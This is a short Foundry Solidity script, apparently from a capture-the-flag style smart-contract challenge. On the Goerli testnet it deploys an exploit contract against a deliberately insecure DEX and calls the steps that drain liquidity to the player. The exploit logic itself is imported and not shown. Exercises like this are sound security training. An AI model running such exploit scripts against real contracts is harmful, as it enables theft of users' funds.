// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Exploit} from "../test/Challenge2.t.sol";
import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

//Execute
//forge script script/Challenge2.s.sol:Challenge2Script --rpc-url $GOERLI_RPC_URL --broadcast --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_KEY
   
contract Challenge2Script is Script {
    function setUp() public {}

    function run() public {

        vm.startBroadcast();

        IERC20 token0 = IERC20(0xb66aac293Fc627B1722d91883760B6A4124f81e6);
        IERC20 token1 = IERC20(0x14cE9850FF547C55c07687292139C5603a2c5DAB);

        Exploit exploit = new Exploit(
          token0, 
          token1, 
          InsecureDexLP(0x2bAb8464e5990A69318b2DdE4B38AA0624d0fC32), 
          msg.sender);
        
        token0.approve(address(exploit), 1 ether);
        token1.approve(address(exploit), 1 ether);
        
        exploit.addFunds();
        exploit.addLiquidity();
        exploit.removeLiquidity();
        exploit.transferToPlayer();

        vm.stopBroadcast();
    }
}
